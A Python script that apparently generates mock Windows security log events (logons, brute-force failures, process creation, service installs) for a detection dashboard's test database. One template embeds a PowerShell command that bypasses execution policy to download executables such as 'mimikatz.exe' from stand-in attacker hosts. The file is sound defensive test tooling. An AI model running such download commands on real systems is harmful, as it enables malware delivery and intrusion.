"""
SoterIA -- Mock Attack Generator
=====================================
Generates realistic fake Windows EVTX-style security logs and inserts them
into the ``security_events`` table every 4 seconds.

Distribution (per spec):
  80 %  -- Event 4624  (Successful Logon)          -> benign
  20 %  -- Event 4625  (Failed Logon / Brute-force) -> high-risk
           Event 4688  (PowerShell downloading .exe) -> high-risk
           Event 7045  (Malicious Service installed)  -> high-risk

Usage
-----
    python -m src.services.mock_generator            # runs until Ctrl-C
    python -m src.services.mock_generator --count 5  # insert exactly 5 events
"""

from __future__ import annotations

import argparse
import random
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

# Ensure project root is importable when run directly
_PROJECT_ROOT = str(Path(__file__).resolve().parent.parent.parent)
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from src.db.database import init_db, insert_event, count_events  # noqa: E402

# ── Constants ────────────────────────────────────────────────────────

_BENIGN_USERS = ["jsmith", "agarcia", "mwilson", "klee", "rsingh"]
_ADMIN_USERS = ["Administrator", "admin", "svc_backup", "domain_admin"]
_NORMAL_IPS = [f"10.0.1.{i}" for i in range(10, 60)]
_SUSPECT_IPS = ["185.220.101.42", "91.240.118.7", "23.129.64.13", "45.155.205.99"]

_MALICIOUS_EXES = [
    "http://evil.corp/payload.exe",
    "http://c2-server.xyz/mimikatz.exe",
    "http://malware-host.ru/beacon.exe",
]

_MALICIOUS_SERVICES = [
    "WindowsUpdateHelper",
    "SvcHostManager",
    "SystemHealthDaemon",
    "WinDefendSvc",
]


# ── Log templates ────────────────────────────────────────────────────


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _benign_4624() -> dict:
    """Normal successful logon."""
    user = random.choice(_BENIGN_USERS)
    ip = random.choice(_NORMAL_IPS)
    raw = (
        f"An account was successfully logged on.\n"
        f"  Subject:\n"
        f"    Security ID:  S-1-5-18\n"
        f"    Account Name: SYSTEM\n"
        f"  Logon Information:\n"
        f"    Logon Type:   3\n"
        f"  New Logon:\n"
        f"    Account Name: {user}\n"
        f"    Account Domain: CORP\n"
        f"  Network Information:\n"
        f"    Source Network Address: {ip}\n"
        f"    Source Port: {random.randint(49152, 65535)}"
    )
    return dict(
        event_id=str(uuid.uuid4()),
        timestamp=_ts(),
        source_ip=ip,
        user_account=user,
        windows_event_id=4624,
        raw_log=raw,
    )


def _attack_4625() -> dict:
    """Brute-force failed logon against admin account."""
    user = random.choice(_ADMIN_USERS)
    ip = random.choice(_SUSPECT_IPS)
    raw = (
        f"An account failed to log on.\n"
        f"  Subject:\n"
        f"    Security ID:  S-1-0-0\n"
        f"    Account Name: -\n"
        f"  Logon Information:\n"
        f"    Logon Type:   10\n"
        f"  Account For Which Logon Failed:\n"
        f"    Account Name: {user}\n"
        f"    Account Domain: CORP\n"
        f"  Failure Information:\n"
        f"    Failure Reason: Unknown user name or bad password.\n"
        f"    Status:         0xC000006D\n"
        f"    Sub Status:     0xC000006A\n"
        f"  Network Information:\n"
        f"    Source Network Address: {ip}\n"
        f"    Source Port: {random.randint(49152, 65535)}"
    )
    return dict(
        event_id=str(uuid.uuid4()),
        timestamp=_ts(),
        source_ip=ip,
        user_account=user,
        windows_event_id=4625,
        raw_log=raw,
    )


def _attack_4688() -> dict:
    """PowerShell downloading a suspicious executable."""
    user = random.choice(_ADMIN_USERS)
    ip = random.choice(_NORMAL_IPS)
    url = random.choice(_MALICIOUS_EXES)
    raw = (
        f"A new process has been created.\n"
        f"  Subject:\n"
        f"    Account Name: {user}\n"
        f"    Account Domain: CORP\n"
        f"  Process Information:\n"
        f"    New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
        f"    Process Command Line: powershell.exe -ep bypass -c \"IWR -Uri '{url}' -OutFile 'C:\\Temp\\update.exe'\"\n"
        f"    Creator Process Name: C:\\Windows\\System32\\cmd.exe\n"
        f"  Network Information:\n"
        f"    Source Network Address: {ip}"
    )
    return dict(
        event_id=str(uuid.uuid4()),
        timestamp=_ts(),
        source_ip=ip,
        user_account=user,
        windows_event_id=4688,
        raw_log=raw,
    )


def _attack_7045() -> dict:
    """Malicious Windows service installed."""
    user = random.choice(_ADMIN_USERS)
    ip = random.choice(_SUSPECT_IPS)
    svc = random.choice(_MALICIOUS_SERVICES)
    raw = (
        f"A service was installed in the system.\n"
        f"  Service Information:\n"
        f"    Service Name:      {svc}\n"
        f"    Service File Name: C:\\Windows\\Temp\\{svc.lower()}.exe\n"
        f"    Service Type:      user mode service\n"
        f"    Service Start Type: auto start\n"
        f"    Service Account:   LocalSystem\n"
        f"  Subject:\n"
        f"    Account Name: {user}\n"
        f"    Account Domain: CORP\n"
        f"  Network Information:\n"
        f"    Source Network Address: {ip}"
    )
    return dict(
        event_id=str(uuid.uuid4()),
        timestamp=_ts(),
        source_ip=ip,
        user_account=user,
        windows_event_id=7045,
        raw_log=raw,
    )


# ── Weighted generator ──────────────────────────────────────────────

_GENERATORS = [
    (_benign_4624, 80),   # 80 % benign
    (_attack_4625, 8),    # \
    (_attack_4688, 7),    # | 20 % attacks (split across 3 types)
    (_attack_7045, 5),    # /
]
_FUNCS, _WEIGHTS = zip(*_GENERATORS)


def generate_one() -> dict:
    """Return a single random security event dict."""
    (fn,) = random.choices(_FUNCS, weights=_WEIGHTS, k=1)
    return fn()


# ── Main loop ────────────────────────────────────────────────────────


def run(max_count: int | None = None, interval: float = 4.0) -> None:
    """Insert events at ``interval`` seconds until ``max_count`` is reached or Ctrl-C."""
    init_db()
    inserted = 0
    print(f"{'=' * 60}")
    print(f"  SOTERIA  //  Mock Attack Generator")
    print(f"  Interval : {interval}s  |  Max events : {max_count or 'inf'}")
    print(f"{'=' * 60}\n")

    try:
        while max_count is None or inserted < max_count:
            event = generate_one()
            insert_event(**event)
            inserted += 1
            label = "BENIGN" if event["windows_event_id"] == 4624 else "ATTACK"
            print(
                f"  [{inserted:>3}]  {label:<7}  "
                f"EventID={event['windows_event_id']}  "
                f"User={event['user_account']:<16}  "
                f"IP={event['source_ip']}"
            )
            if max_count is None or inserted < max_count:
                time.sleep(interval)
    except KeyboardInterrupt:
        print("\n  [!] Stopped by user.")

    total = count_events()
    print(f"\n  Done. Inserted {inserted} events this run.  Total in DB: {total}")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SoterIA mock log generator")
    parser.add_argument("--count", type=int, default=None, help="Number of events to insert (default: infinite)")
    parser.add_argument("--interval", type=float, default=4.0, help="Seconds between inserts (default: 4)")
    args = parser.parse_args()
    run(max_count=args.count, interval=args.interval)
